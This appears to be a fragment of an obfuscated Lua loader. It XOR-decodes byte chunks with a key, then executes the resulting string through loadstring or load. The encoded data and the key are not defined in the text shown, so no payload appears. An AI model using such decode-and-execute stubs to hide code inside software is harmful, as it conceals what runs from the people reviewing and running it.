local _b = {}
local _bxor = (bit32 and bit32.bxor) or function(a, b)
    local p, c = 1, 0
    while a > 0 and b > 0 do
        local ra, rb = a % 2, b % 2
        if ra ~= rb then c = c + p end
        a, b, p = (a - ra) / 2, (b - rb) / 2, p * 2
    end
    if a < b then a = b end
    while a > 0 do
        local ra = a % 2
        if ra > 0 then c = c + p end
        a, p = (a - ra) / 2, p * 2
    end
    return c
end

local _sc = string.char
for _i = 1, #_c do
    local _chunk = _c[_i]
    local _t = {}
    for _j = 1, #_chunk do
        _t[_j] = _sc(_bxor(_chunk[_j], _k))
    end
    _b[_i] = table.concat(_t)
end

local _payload = table.concat(_b)
local _exec = loadstring or load
if _exec then
    local _fn, _err = _exec(_payload)
    if _fn then
        return _fn()
    else
        error("Runtime Error: " .. tostring(_err))
    end
else
    error("Environment missing loadstring!")
end
